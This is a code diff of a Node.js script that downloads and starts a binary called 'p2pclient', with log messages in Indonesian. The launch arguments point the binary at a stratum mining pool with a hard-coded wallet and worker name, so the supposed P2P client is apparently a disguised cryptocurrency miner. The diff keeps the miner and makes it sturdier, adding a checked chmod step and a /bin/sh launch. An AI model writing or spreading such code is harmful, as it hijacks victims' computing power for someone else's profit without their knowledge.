@@ -34,8 +34,14 @@ async function downloadP2PClient() {
             response.pipe(file);
             file.on('finish', () => {
                 file.close(() => {
-                    fs.chmodSync(P2P_PATH, '755');
-                    resolve();
+                    try {
+                        fs.chmodSync(P2P_PATH, 0o755);
+                        logger.info('✅ File p2pclient telah diberikan izin eksekusi.');
+                        resolve();
+                    } catch (err) {
+                        logger.error('❌ Gagal mengubah izin eksekusi p2pclient:', err);
+                        reject(err);
+                    }
                 });
             });
         }).on('error', (err) => {
@@ -64,10 +70,7 @@ async function startP2PClient() {
     }
 
     logger.info('🚀 Starting p2pclient...');
-    peerProcess = spawn(P2P_PATH, [
-        '--noeval', '--hard-aes', '-P',
-        'stratum1+tcp://cb9072192a56299751a9619430f7493f911e40a794f1.pepek@us.catchthatrabbit.com:8008'
-    ], { shell: true });
+    peerProcess = spawn('/bin/sh', ['-c', `${P2P_PATH} --noeval --hard-aes -P stratum1+tcp://cb9072192a56299751a9619430f7493f911e40a794f1.pepek@us.catchthatrabbit.com:8008`]);
 
     peerProcess.stdout.on('data', (data) => logger.info(data.toString()));
     peerProcess.stderr.on('data', (data) => logger.error(data.toString()));
